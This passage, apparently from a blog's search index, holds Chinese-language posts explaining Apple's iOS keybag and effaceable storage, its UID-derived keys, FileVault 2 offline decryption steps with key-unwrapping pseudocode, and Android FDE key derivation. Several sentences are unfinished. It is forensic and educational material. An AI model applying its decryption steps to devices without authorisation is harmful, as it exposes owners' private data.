级别访问权限的用户都可以轻松地获得并展开暴力破解，这显然是非常危险的。<br>从 iOS 5 开始，苹果公司将 DKey 从设备密钥包中取出，存储路径转移到安全隔区专用的<code>Effaceable Storage</code>之中。<br>从 iOS 8 开始，为了应对 GrayKey 密码破解设备破解苹果公司又开发了</p>\n<p>由于 DKey 仅受 UID 的保护，，从而解密绝大多数文件</p>\n<blockquote>\n<p>iOS 8 之后，苹果公司将文件系统的默认类型调整为<code>Class C</code>，目的就是将类密钥纳入 Passcode 的保护范围，因此目前 NSFileProtectionNone 类型的文件已经大为减少，这些文件在设备开机后就一直保持可访问状态</p>\n</blockquote>\n<h2 id=\"Effaceable-lockers\"><a href=\"#Effaceable-lockers\" class=\"headerlink\" title=\"Effaceable lockers\"></a>Effaceable lockers</h2><ul>\n<li>EMF!<br>  • Data partition encryption key, encrypted with key 0x89B<br>  • Format: length (0x20) + AES(key89B, emfkey)</li>\n<li>Dkey<br>  • NSProtectionNone class key, wrapped with key 0x835<br>  • Format: AESWRAP(key835, Dkey)</li>\n<li>BAG1<br>  • System keybag payload key<br>  • Format : magic (BAG1) + IV + Key<br>  • Read from userland by keybagd to decrypt systembag.kb<br>  • Erased at each passcode change to prevent attacks on previous keybag</li>\n</ul>\n<p>AppleEffaceableStorage IOKit userland interface<br>Selector Description Comment<br>0 getCapacity 960 bytes<br>1 getBytes requires PE_i_can_has_debugger<br>2 setBytes requires PE_i_can_has_debugger<br>3 isFormatted<br>4 format<br>5 getLocker input : locker tag, output : data<br>6 setLocker input : locker tag, data<br>7 effaceLocker scalar input : locker tag<br>8 lockerSpace ?</p>\n<h2 id=\"一、安全隔区的内置核心密钥\"><a href=\"#一、安全隔区的内置核心密钥\" class=\"headerlink\" title=\"一、安全隔区的内置核心密钥\"></a>一、安全隔区的内置核心密钥</h2><p><img src=\"/arch0.jpg\" alt=\"Arch0\"></p>\n<h3 id=\"3-UID-派生密钥\"><a href=\"#3-UID-派生密钥\" class=\"headerlink\" title=\"3. UID 派生密钥\"></a>3. UID 派生密钥</h3><ul>\n<li>根据不同用途使用各自的派生密钥，而不是直接使用 UID，可以有效减少 UID 被泄露的风险</li>\n<li>安全隔区启动时，将从 UID 派生出多个硬件密钥，加密因子是不同的<strong>固定盐</strong></li>\n<li>这些派生的硬件密钥都在内存中，无需持久化存储</li>\n</ul>\n<p>以下是一些常用的派生密钥：</p>\n<ul>\n<li>Key 0x835 &#x3D; AES(UID, 01010101010101010101010101010101)；保护<code>Class key</code>，也被称为<code>device key</code></li>\n<li>Key 0x836 &#x3D; AES(UID, 00E5A0E6526FAE66C5C1C6D4F16D6180)</li>\n<li>Key 0x837 &#x3D; AES(GID, 345A2D6C5050D058780DA431F0710E15)</li>\n<li>Key 0x838 &#x3D; AES(UID, 8C8318A27D7F030717D2B8FC5514F8E1)</li>\n<li>Key 0x89B &#x3D; AES(UID, 183e99676bb03c546fa468f51c0cbd49)；保护<code>EMF key</code></li>\n</ul>\n<h3 id=\"1-UID-GID\"><a href=\"#1-UID-GID\" class=\"headerlink\" title=\"1. UID &amp; GID\"></a>1. UID &amp; GID</h3><ul>\n<li>UID 是一个 AES 256 位密钥，在 SOC 制造过程中写入一次性的<strong>熔丝</strong></li>\n<li>每个设备的 UID 唯一且无法更改，Apple 或其任何供应商都不会记录 UID</li>\n<li>UID 不能被固件或软件读取，只能由处理器的硬件 AES 引擎使用</li>\n<li>UID 与设备上的任何其他标识符无关，包括但不限于 UDID</li>\n</ul>\n<blockquote>\n<p>UDID（Unique Device Identifier）是苹果 iOS 设备的唯一识别码，它由40个字符的字母和数字组成，利用 UDID 可以识别移动设备和跟踪用户行为<br><code>UDID = SHA1(Serial Number + ECID + LOWERCASE (WiFi Address) + LOWERCASE(Bluetooth Address))</code></p>\n</blockquote>\n<h3 id=\"3-Class-Key-的使用\"><a href=\"#3-Class-Key-的使用\" class=\"headerlink\" title=\"3. Class Key 的使用\"></a>3. Class Key 的使用</h3><p>用户开机成功后，类密钥就保留在内存中，后续将根据不同事件触发相应的处理流程。</p>\n<h4 id=\"主动锁屏-超时锁屏\"><a href=\"#主动锁屏-超时锁屏\" class=\"headerlink\" title=\"主动锁屏 &amp; 超时锁屏\"></a>主动锁屏 &amp; 超时锁屏</h4><p>• FileProtectionComplete key removed from RAM<br>• All Complete protection files now unreadable<br>• Other keys remain present<br>• Allows connection to Wi-Fi<br>• Lets you see contact information when phone rings<br>• [I once found an edge case where this doesn’t happen…]</p>\n<ul>\n<li>设备锁屏 10 秒后，Class key A 将从内存中删除，此时无法访问 <code>NSFileProtectionComplete</code> 保护类型的文件（例如照片、记事本等数据）</li>\n<li><code>NSFileProtectionCompleteUntilFirstUserAuthentication</code>类型的文件仍然可以访问（这是所有第三方 APP 数据文件的默认类型），因为Class key C 在内存中</li>\n<li><code>NSFileProtectionCompleteUnlessOpen</code> 是为了解决有些文件可能需要在锁屏后继续写入的需求，例如后台下载邮件附件等，<br>  此行为通过使用非对称椭圆曲线加密技术实现，将临时公钥与封装的文件独有密钥一起储存。一旦文件关闭，<code>per-file key</code>就会从内存中擦除。<br>  要再次打开该文件，系统会使用私钥和文件的临时公钥重新创建共享密钥，用来解开<code>per-file key！</code>的封装， 然后用<code>per-file key</code>来解密文件</li>\n</ul>\n<h4 id=\"用户重设-passcode\"><a href=\"#用户重设-passcode\" class=\"headerlink\" title=\"用户重设 passcode\"></a>用户重设 passcode</h4><p>• The system keybag is duplicated<br>• Class keys wrapped using new passcode key (encrypted<br>with 0x835 key, wrapped with passcode)<br>• New BAG key created and stored in effaceable storage<br>• Old BAG key thrown away<br>• New keybag encrypted with BAG key</p>\n<h4 id=\"用户擦除-NAND-数据\"><a href=\"#用户擦除-NAND-数据\" class=\"headerlink\" title=\"用户擦除 NAND 数据\"></a>用户擦除 NAND 数据</h4><p>• mobile_obliterator daemon<br>• Erase DKey by calling MKBDeviceObliterateClassDKey<br>• Erase EMF key by calling selector 0x14C39 in EffacingMediaFilter service<br>• Reformat data partition<br>• Generate new system keybag<br>• High level of confidence that erased data cannot be recovered</p>\n<p>Effaceable storage is wiped, destroying:<br>• DKey: All “File protection: none” files are unreadable<br>• Bag key: All other class keys are unreadable<br>• EMF key: Can’t decrypt the filesystem anyway</p>\n<h3 id=\"设备重启\"><a href=\"#设备重启\" class=\"headerlink\" title=\"设备重启\"></a>设备重启</h3><p>• File Protection Complete key lost from RAM<br>• Complete until First Authentication key also lost<br>• Only “File Protection: None” files are readable<br>• And then only by the OS on the device<br>• Because FDE</p>\n<h2 id=\"破解Passcode-Key的手段\"><a href=\"#破解Passcode-Key的手段\" class=\"headerlink\" title=\"破解Passcode Key的手段\"></a>破解Passcode Key的手段</h2><p>假设把每个文件的加密看作为上了一道锁的话，那么对应的开锁的钥匙就存放在系统密钥包里面，而锁屏密码除了防止用户进入系统桌面之外，更重要的角色就是利用密码对系统密钥包进行额外的加密保护。很多人对锁屏密码理解的一个误区，就是锁屏密码只是物理手段上防止进入手机的一个保护，但实际上，用户在第一次设置锁屏密码的时候，锁屏密码会结合硬件加密引擎生成一个叫做Passcode Key的密钥，通过这个密钥对保存在密钥包中的各个钥匙(Class Key)进行加密保护。锁屏密码不会以其他加密的形式保存在设备上，用户在解锁的时候，会直接用输入的密码生成Passcode Key对密钥包中的Class Key解密，解密失败代表用户密码错误。</p>\n<p>从苹果的数据加密和锁屏密码的保护机制来看，直接拆除存储芯片并对其进行文件读写操作是不可能的。</p>\n<p>Passcode Key是用户输入的passcode结合系统硬件的加密引擎以及PBKDF2(Password-Based Key Derivation Function)算法生成的。PBKDF2 的基本原理是通过一个伪随机函数，把明文和一个盐值及加密重复次数作为输入参数，然后重复进行运算，并最终产生密钥。重复运算的会使得暴力破解的成本变得很高，而硬件key及盐值的添加基本上断绝了通过“彩虹表”攻击的可能 。</p>\n<p>由于硬件加密引擎的Key无法提取，所以 只能在目标的机器上运行暴力破解程序进行破解，假设用户的密码设置的足够复杂的话，那么破解的周期就会变得非常久。</p>\n<p>在FBI这个案例中，由于嫌犯可能开启了输错10次密码自动擦除设备的选项，一旦暴力猜测程序连续10次输入错误的密码，设备上的所有内容就会擦除掉。一旦触发数据擦除，苹果会首先对可安全擦除区域进行擦除，物理方式上即使能够恢复大部分加密数据，但是却无法恢复可安全擦除区域中的数据，因为大部分的解密密钥都保存在这个区域中，例如能够解开系统密钥包的二进制数据的BAG1 Key。</p>\n<p>后续苹果为了封堵各种暴力猜测Passcode的方法，在64位设备的Secure Enclave中增加了定时器，针对尝试密码的错误次数，增加尝试的延时，即使断电重启也无法解决。</p>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.kaotenforensic.com/ios/ios-data-protection/\">iOS资料保护机制简介</a></li>\n<li><a href=\"https://toutiao.io/posts/324007/app_preview\">苹果的锁屏密码到底有多难破？ - 头条</a></li>\n</ul>\n"},{"title":"Apple数据保护技术专题之四：FileVault2","url":"/2022/12/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9AFileVault2/","content":"<p>从本质上说，FileVault 属于 FDE（Full Disk Encryption，全盘加密）技术，早期的 Android 设备也是采用此方案，但随着技术发展，Andriod 和 iOS 逐渐都演进为 FBE（File Based Encryption，文件加密），仅在 MacOS 中保留了 FileVault2，但同时也支持 DataProtection 数据保护技术。</p>\n<h2 id=\"一、Legacy-FileVault\"><a href=\"#一、Legacy-FileVault\" class=\"headerlink\" title=\"一、Legacy FileVault\"></a>一、Legacy FileVault</h2><p>2003年，Mac OS X Panther (黑豹，10.3) 首次发布了 FileVault，当时的版本只加密了用户目录（而非启动宗卷），方法是采用一个巨大的稀疏磁盘镜像文件（sparse disk image）作为虚拟磁盘，负责存储加密的文件元数据。在启用 FileVault 功能时，系统会要求用户设置一个<strong>主密码</strong>，当用户忘记密码时，需要这个主密码或是恢复密钥直接解密文件。</p>\n<blockquote>\n<p>与磁盘镜像文件<code>.dmg</code>不同，稀疏磁盘镜像文件<code>.sparseimage</code>的实际磁盘占用空间是根据使用情况动态扩展的</p>\n</blockquote>\n<p>2006年，Mac OS X Leopard（花豹，10.5）做了少许改进，将虚拟磁盘改为稀疏绑定磁盘镜像（sparse bundle disk image），特点是将文件分割为若干个 8MB 的小文件（Band），在文件修改时无需复制全部内容，仅复制本次修改的 Band，因此备份速度更快，非常适合 Time Machine 的需求。</p>\n<p>Apple 将上述两种版本的技术统称为legacy FileVault，其存在很多严重问题，包括：</p>\n<ul>\n<li>只加密了用户目录的元数据，实际上数据文件的内容并未加密</li>\n<li>采用 1024-bit RSA 或 3DES-EDE 算法已被证明存在破解风险，加密算法 CBC 模式的安全强度不足</li>\n<li>当 MacOS 置于睡眠模式时，密钥存在的泄露风险</li>\n</ul>\n<h3 id=\"二、FileVault-2\"><a href=\"#二、FileVault-2\" class=\"headerlink\" title=\"二、FileVault 2\"></a>二、FileVault 2</h3><p>2010年，Mac OS X Lion (狮子，10.7) 发布了重新设计的 FDE 方案 - FileVault 2，其技术特点包括：</p>\n<ol>\n<li>启动卷宗的分区由 HFS+ 文件系统改为一个 CoreStorage 管理的加密卷，并增加了一个 Recovery HD 分区卷</li>\n<li>使用<strong>用户登录密码</strong>作为加密令牌，</li>\n<li>加密标准采用 NIST 推荐的 AES-128-AES 模式，分为并采用AES的XTS-AES模式将数据划分成128位的块，同时生成一枚256位密钥来加密磁盘，这一标准也是NIST推荐的标准。当用户解锁后，其他用户也可以访问这些数据，直到电脑关机。</li>\n</ol>\n<blockquote>\n<p>CBC 引入了一个IV值递归　上一组加密后产生新的IV值作为下一数据块加密的输入 这样至少有个一个参数不同　但带来的问题是没有办法随机访问各个区块了，访问某个区块必须解出前一个区块数据。<br>XTS 模式加入了 tweak key 与 AES key 互相配合，各个区块用同样的AES key 但Tweak key 不相同 比如设置为与区块的index 成对应关系, 这样各个区块数据加密解密互相独立（独立的tweak key)</p>\n</blockquote>\n<p>抛弃了基于 HFS+ 文件系统，通过磁盘镜像对 HFS+ 文件系统的元数据加密的技术路线，采用了全新设计的</p>\n<ul>\n<li>直接加密整个 Mac OS 的启动宗卷（自然也包括用户目录），并</li>\n<li>采用这种加密方法，已授权的用户信息将从一个单独的非加密引导卷宗读取。(分区格式为 Apple_Boot)。</li>\n</ul>\n<p>FileVault</p>\n<p>约有3%的I&#x2F;O的性能下降会出现在使用AES指令集的CPU上（如Intel Broadwell 架构CPU， OS X 10.10.3环境），早期的酷睿CPU，或者其他不使用该指令集的处理器会有更明显的性能下降。</p>\n<p>系统运行时执行 FileVault2，电脑会创建一个<strong>恢复密钥</strong>，并在屏幕上显示出来，提示用户保管，并且提供了一个将密钥上传至 Apple 的可选项。恢复密钥共有120位，由全部英文字母和数字 1-9 组成，系统会调用&#x2F;dev&#x2F;random的随机数生成器生成整枚密钥。因此其安全性取决于macOS 使用的随机数生成算法，根据密码学家 2012 年的声明指出，该算法是安全的。</p>\n<p>除非重新加密整个卷宗，否则将无法修改恢复密钥。</p>\n<p><img src=\"/2022/12/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9AFileVault2/vmk.png\" alt=\"Volume Main Key\"></p>\n<p>在了解了 FileVault2 加密的流程之后，可以根据具体方 法得到相对应的解密流程。将加密后的磁盘用外部工具加 载观察，从磁盘结构来看，加密后的硬盘与加密前硬盘发 生了重大的变化。通过对加密数据研究和相关资料文献的阅读，得 知加密卷的卷头存储了解密所需的各种相关参数 [4]。图 2 为 FileVault2 解密流程。</p>\n<p>根据对加密卷数据分析可得加密卷的头部主要包含有 如下信息 :<br>卷头部签名、块大小、卷大小、元数据大小、第一个 元数据块块号、第二个元数据块块号、第三个元数据块块号、 第四个元数据块块号、加密方法、逻辑卷 ID(用于解密加 密的密钥文件)、物理卷 ID[5]。<br>解密步骤如下 :<br>1)识别到 FileVault2 加密卷和存储的需要提取的用户 密码生成的主密钥信息或者恢复令牌的 EncryptedRoot.plist. wipekey 文件 ;<br>2)解密通过文件系统解析获得的 EncryptedRoot.plist. wipekey 文件后，提取存储的密钥信息 ;<br>3)输入用户登录密码或者恢复密钥，验证步骤 2)中 提取到的密钥信息是否正确 ;<br>4)验证正确后根据用户密码或者恢复密钥及加密的 EncryptedRoot.plist.wipekey 文件中存储的密钥信息生成主 密钥和 tweak key ;<br>5)用生成的两个解密密钥信息(key1 和 key2)及加密 卷数据进行解密，生成解密数据即完成解密。<br>用取证工具或其他可以解析 HFSPlus 文件系统的工具 对解密数据进行解析，可以验证解密结果是否正确。</p>\n<p><img src=\"/2022/12/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9AFileVault2/arch.png\" alt=\"密钥层次架构\"></p>\n<h3 id=\"VEK-Volume-Encryption-Key，卷宗封装密钥\"><a href=\"#VEK-Volume-Encryption-Key，卷宗封装密钥\" class=\"headerlink\" title=\"VEK - Volume Encryption Key，卷宗封装密钥\"></a>VEK - Volume Encryption Key，卷宗封装密钥</h3><hr>\n<p>关键文件：EncryptedRoot.plist</p>\n<p>Once decrypted, the file EncryptedRoot.plist has an XML structure with the following important entries:<br>• PassphraseWrappedKEKStruct(1)<br>– 284 byte structure for recovery password.<br>• PassphraseWrappedKEKStruct(2)<br>– 284 byte structure for user password.<br>• KEKWrappedVolumeKeyStruct(1) – unused.<br>• KEKWrappedVolumeKeyStruct(2)<br>– contains wrapped volume master key.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">p = get_user_password()                                 <span class=\"comment\">// 用户输入password </span></span><br><span class=\"line\">salt = get_salt_from_PassphraseWrappedKEK()</span><br><span class=\"line\">iterations = <span class=\"number\">41000</span></span><br><span class=\"line\">pk = pbkdf2(p, salt, iterations, HMAC-SHA256)           <span class=\"comment\">// 计算PDK</span></span><br><span class=\"line\">kek_wrapped = get_kek_from_PassphraseWrappedKEK()           </span><br><span class=\"line\">kek = aes_unwrap(kek_wrapped, pk)                       <span class=\"comment\">// 获得</span></span><br><span class=\"line\">vmk_wrapped = get_vmk_from_KEKWrappedVolumeKey()</span><br><span class=\"line\">vmk = aes_unwrap(vmk_wrapped, kek)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Android-的-FDE-历程\"><a href=\"#Android-的-FDE-历程\" class=\"headerlink\" title=\"Android 的 FDE 历程\"></a>Android 的 FDE 历程</h2><p>FDE加密又是怎么一回事呢，看看google怎么定义的吧（以下部分内容引用网络某大神的解释）：</p>\n<ul>\n<li><p>安卓会通过一个随机生成的128位设备加密密钥 (Device Encryption Key, DEK) 来加密设备的文件系统。</p>\n</li>\n<li><p>安卓使用用户的PIN或者密码来加密DEK，并将它存储在设备加密过的文件系统上。从物理上来讲，它也在设备的闪存芯片中。当你输入正确的PIN或密码时，设备可以解锁DEK，并使用密钥来解锁文件系统。</p>\n</li>\n<li><p>实际上，DEK是使用用户的PIN或密码，外加一个被称为KeyMaster Key Blob的加密数据块来进行加密的。这个数据块包含一个由KeyMaster程序生成的2048位RSA密钥，它运行在设备处理器上的一个安全区域上。KeyMaster会创建RSA密钥，将其存储在数据块中，并为安卓系统创建一份加密过的拷贝版本。<br>  安卓系统和你的移动应用运行在处理器的非安全区域上。安卓没有访问KeyMaster的安全世界的权限，因此它无法知晓数据块里的RSA密钥。安卓只能获得这个数据块的加密版本，而只有KeyMaster能够解密它。</p>\n</li>\n<li><p>当你输入PIN或密码时，安卓拿到加密过的数据块，并将它和使用scrypt处理过的PIN或密码一起，传回运行在处理器安全区域上的KeyMaster。KeyMaster将私密地使用处理器中带有的私钥来对数据块进行解密，获得长RSA密钥。然后，它将私密地使用scrypt处理过的PIN或密码，外加长RSA密钥，来制造一个RSA签名，并将签名发回给安卓。之后安卓使用一系列算法来处理这一签名，并最终解密DEK，解锁设备。</p>\n</li>\n</ul>\n<p>因此，全部流程都基于KeyMaster的数据块。数据块包含解密DEK所需的长RSA密钥。安卓只拥有加密后的数据块，而只有用户才有PIN或密码。此外，只有KeyMaster才能解密加密过的数据块。</p>\n<h3 id=\"Google-的版本历史\"><a href=\"#Google-的版本历史\" class=\"headerlink\" title=\"Google 的版本历史\"></a>Google 的版本历史</h3><ul>\n<li>Android 4：首次引入 FDE 的 beta版本，由于 CPU 普遍不支持硬件加密严重影响速度，并未普遍应用</li>\n<li>Android 5: Google 推出 5.0 强制采用 FDE 加密，由于终端厂商的普遍抵制又推出 5.1 版本，改为用户自行设置是否启用</li>\n<li>Android 6: 高通发布骁龙810支持硬件加密，6.0 版本终于强制采用 FDE 加密</li>\n</ul>\n<h3 id=\"5-0中的加密-磁盘加密密钥-的实现逻辑\"><a href=\"#5-0中的加密-磁盘加密密钥-的实现逻辑\" class=\"headerlink\" title=\"5.0中的加密 磁盘加密密钥 的实现逻辑\"></a>5.0中的加密 磁盘加密密钥 的实现逻辑</h3><ol>\n<li>产生随机16 Bytes DEK(disk encryption key–磁盘加密用的密钥)及16 Bytes SALT；</li>\n<li>对(用户密码+SALT)使用scrypt算法产生32 Bytes HASH 作为IK1(intermediate key 1);</li>\n<li>将IK1填充到硬件产生的私钥规格大小(目前看到是RSA算法，256Bytes), 具体是:<br>00 || IK1 || 00..00  ## one zero byte, 32 IK1 bytes, 223 zero bytes.</li>\n<li>使用硬件私钥 HBK 对 IK1 进行签名，生成256 Bytes签名数据作为IK2；</li>\n<li>对(IK2+SALT)使用scrypt算法(与第二步中的SALT相同)产生出32 Bytes HASH 作为IK3；</li>\n<li>使用IK3前16 Bytes作为KEK(用来加密主密钥DEK的KEY)，后16 Bytes作为算法IV(初始化向量)；</li>\n<li>使用AES_CBC算法，采用KEK作为密钥，IV作为初始化向量来加密用户的主密钥DEK，生成加密后的主密钥，存入分区尾部数据结构中；</li>\n</ol>\n<hr>\n<p>Secure Startup<br>Secure Startup 為 FDE 的延伸版本，唯一的差別是保護加密&#x2F;解密的 Masterkey 金鑰的方式不同。原本在 FDE 架構下保護 Masterkey 的其中一個密碼為 default_password，在 Secure Startup 下可改為用戶自訂的螢幕鎖密碼。</p>\n<h2 id=\"AFPS\"><a href=\"#AFPS\" class=\"headerlink\" title=\"AFPS\"></a>AFPS</h2><p><img src=\"/2022/12/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9AFileVault2/apfs_concepts.png\" alt=\"AFPS\"></p>\n<h2 id=\"https-bombich-com-kb-ccc5-working-apfs-volume-groupshttps-www-ntfs-com-apfs-structure-htm\"><a href=\"#https-bombich-com-kb-ccc5-working-apfs-volume-groupshttps-www-ntfs-com-apfs-structure-htm\" class=\"headerlink\" title=\"https://bombich.com/kb/ccc5/working-apfs-volume-groupshttps://www.ntfs.com/apfs-structure.htm\"></a><a href=\"https://bombich.com/kb/ccc5/working-apfs-volume-groups\">https://bombich.com/kb/ccc5/working-apfs-volume-groups</a><br><a href=\"https://www.ntfs.com/apfs-structure.htm\">https://www.ntfs.com/apfs-structure.htm</a></h2><h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><p>Stephen Foskett 是一名存储技术专家，其个人博客对 FileVault 进行了非常有价值的分析。<br>请参见<a href=\"https://blog.fosketts.net/2011/08/04/mac-osx-lion-corestorage-volume-manager/\">MacOS X 的 Corestorage 逻辑卷组管理器</a></p>\n<ul>\n<li><a href=\"https://github.com/drduh/macOS-Security-and-Privacy-Guide/blob/master/README-cn.md\">MacOS 的安全和隐私指南</a></li>\n<li><a href=\"FileVault2%E5%8A%A0%E5%AF%86%E5%88%86%E5%8C%BA%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%85%B6%E5%8F%96%E8%AF%81%E5%BA%94%E7%94%A8_%E8%93%9D%E6%9C%9D%E7%A5%A5.pdf\">FileVault2加密分区离线解密技术及其取证应用 - 蓝朝祥</a></li>\n<li><a href=\"slides_fv2_ifip_2013.pdf\">Security Analysis and Decryption of FileVault 2 - Omar Choudary</a></li>\n<li><a href=\"2012-374.pdf\">Infiltrate the Vault: Security Analysis and Decryption of Lion Full Disk Encryption - Omar Choudary</a></li>\n<li><a href=\"https://page.om.qq.com/page/O3yauEIx2l-9WrUkHgQgRUBw0\">你的安卓手机究竟是FDE加密还是FBE加密？</a></li>\n<li><a href=\"https://blog.csdn.net/bob_fly1984/article/details/80369900\">android FDE功能介绍</a></li>\n</ul>\n"},{"title":"Apple数据保护技术分析","url":"/2022/10/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<p>花了好长时间，才明白Apple公司数据保护（Data Protection）的核心。</p>\n<p>根据Apple安全白皮书的官方文档，数据保护实际上有两条路径，一是面向智能终端的 iOS 发展来的 Data Protection，二是面向个人电脑的 MacOS 发展来的数据保险箱，由于依赖Intel CPU，数据安全就是各种打补丁。M1 发布后两条路径开始融合，Secure Encalve 和 AFPS 成为融合的基石。<br>任何技术都有路径依赖，虽然 HFS+ 被认为是业界最烂的文件系统，但其许多重要的核心功能仍然需要 AFPS 继承下来，当然也为后续发展打下基础。</p>\n<p><img src=\"/2022/10/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/arch2.png\" alt=\"更细架构\"></p>\n<ul>\n<li>每个文件创建时会生成一个<code>Per-file Key</code>，在文件写入闪存时通过硬件用<code>AES-XTS</code>算法加密</li>\n<li><code>Per-file Key</code>存储在文件元数据 Metadata 中，被<code>Class Key</code>和<code>Filesystem Key</code>加密</li>\n<li><code>Class Key</code>和<code>Filesystem Key</code>都被硬件密钥<code>UID</code>保护</li>\n<li><code>Class Key</code>还被用户密码<code>Passcode</code>保护</li>\n</ul>\n<p>实际上，Apple就是在 HFS+ 文件系统的 inode 中增加了一个<code>cprotect</code> 字段：</p>\n<ul>\n<li>如果数据保护级别是 A &#x2F; B &#x2F; C，存储以<code>Class Key</code>加密的<code>Per-file Key</code></li>\n<li>如果数据保护级别是 D，存储加密后的<code>DKey</code>(Device Key，正好也是D)</li>\n<li>如果设置为<code>discarded</code>，则意味着密码失效，文件就永远无法打开，也是数据被抹去了…</li>\n</ul>\n<h2 id=\"一-安全隔区有那些内置的核心密钥？\"><a href=\"#一-安全隔区有那些内置的核心密钥？\" class=\"headerlink\" title=\"一. 安全隔区有那些内置的核心密钥？\"></a>一. 安全隔区有那些内置的核心密钥？</h2><p><img src=\"/2022/10/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/keys.png\" alt=\"密钥关系图\"></p>\n<h3 id=\"1-UID-GID\"><a href=\"#1-UID-GID\" class=\"headerlink\" title=\"1. UID &amp; GID\"></a>1. UID &amp; GID</h3><ul>\n<li>UID 是一个AES 256 位密钥，在 SOC 制造过程中写入一次性的<strong>熔丝</strong>，每个设备唯一且无法更改</li>\n<li>UID 不能被固件或软件读取，只能由处理器的硬件 AES 引擎使用</li>\n<li>Apple 或其任何供应商都不会记录 UID</li>\n<li>UID 与设备上的任何其他标识符无关，包括但不限于 UDID</li>\n</ul>\n<blockquote>\n<p><code>UDID = SHA1(Serial Number + ECID + LOWERCASE (WiFi Address) + LOWERCASE(Bluetooth Address))</code></p>\n</blockquote>\n<h4 id=\"派生的硬件密钥\"><a href=\"#派生的硬件密钥\" class=\"headerlink\" title=\"派生的硬件密钥\"></a>派生的硬件密钥</h4><p>安全隔区启动时，将从 UID 派生出多个硬件密钥，加密因子是不同的固定盐。<br>这些派生的硬件密钥都在内存中，无需持久化存储。<br>在各种业务场景下，使用不同的派生密钥，而不是直接使用 UID，可以有效减少 UID 被泄露的风险。</p>\n<ul>\n<li>Key 0x835 &#x3D; AES(UID, 01010101010101010101010101010101)；保护<code>Class key</code>，也被称为<code>device key</code></li>\n<li>Key 0x836 &#x3D; AES(UID, 00E5A0E6526FAE66C5C1C6D4F16D6180)</li>\n<li>Key 0x837 &#x3D; AES(GID, 345A2D6C5050D058780DA431F0710E15)</li>\n<li>Key 0x838 &#x3D; AES(UID, 8C8318A27D7F030717D2B8FC5514F8E1)</li>\n<li>Key 0x89B &#x3D; AES(UID, 183e99676bb03c546fa468f51c0cbd49)；保护<code>EMF key</code></li>\n</ul>\n<h3 id=\"2-Passcode-Passcode-Key-KEK\"><a href=\"#2-Passcode-Passcode-Key-KEK\" class=\"headerlink\" title=\"2. Passcode &amp; Passcode Key &#x3D; KEK\"></a>2. Passcode &amp; Passcode Key &#x3D; KEK</h3><p>Passcode Key是用戶輸入的passcode結合系統硬件的加密引擎以及PBKDF2(Password-Based Key Derivation Function)算法生成的。PBKDF2的基本原理是通過一個偽隨機函數，把明文和一個鹽值及加密重複次數作為輸入參數，然後重複進行運算，並最終產生密鑰。重複運算的會使得暴力破解的成本變得很高，而硬件key及鹽值的添加基本上斷絕了通過“彩虹表”攻擊的可能。</p>\n<p><code>Passcode key = PBKDF2(SHA256, passcode, UID, iter=1, outputLength=32)</code><br><img src=\"/2022/10/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/passcode-key.png\" alt=\"passcode-key-kdf\"></p>\n<blockquote>\n<p>KEK，密钥加密密钥，好像就是Passcode Key，但是可能只限于Mac OS，而非 iOS？</p>\n</blockquote>\n<p>Passcode-derived key (PDK) The encryption key derived from the entangling of the user password with the long-term SKP key and the UID of the Secure Enclave.</p>\n<h3 id=\"3-xART-key\"><a href=\"#3-xART-key\" class=\"headerlink\" title=\"3. xART key\"></a>3. xART key</h3><p>扩展反重放技术的密钥（eXtended Anti-Replay Technology key），就是第二代安全存储组件的<strong>唯一加密密钥</strong>.<br>后续苹果为了封堵各种暴力猜测Passcode的方法，在64位设备的Secure Enclave中增加了定时器，针对尝试密码的错误次数，增加尝试的延时，即使断电重启也无法解决。</p>\n<h2 id=\"二-安全隔区访问的Secure-Nonvolatile-Storage是什么？\"><a href=\"#二-安全隔区访问的Secure-Nonvolatile-Storage是什么？\" class=\"headerlink\" title=\"二. 安全隔区访问的Secure Nonvolatile Storage是什么？\"></a>二. 安全隔区访问的<code>Secure Nonvolatile Storage</code>是什么？</h2><p><img src=\"/2022/10/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/arch3.jpg\" alt=\"基本结构\"></p>\n<p>CPU都是通用的，这些关键密钥都是个性化数据，必须有一个存储设备提供数据持久化！<br>秘密就藏在 NAND 闪存的1号扇区，Apple 将它作为隐藏的可安全擦除区域(Effaceable Storage)，就是安全隔区的技术架构中的<code>Secure nonvolatile storage</code>。</p>\n<blockquote>\n<p>Effaceable Storage：accesses the underlying storage technology (for example, NAND) to directly address and erase a small number of blocks at a very low level.</p>\n</blockquote>\n<p>当然，Apple官方文档说安全隔区通过专用 I2C 总线连接，但 NAND 闪存不太可能再增加一个物理接口，也许是复用吧。<br>这个隐藏存储区域的容量是 960 Bytes，存储了3个关键数据。</p>\n<h3 id=\"1-EMF-key-LwVM-VEK\"><a 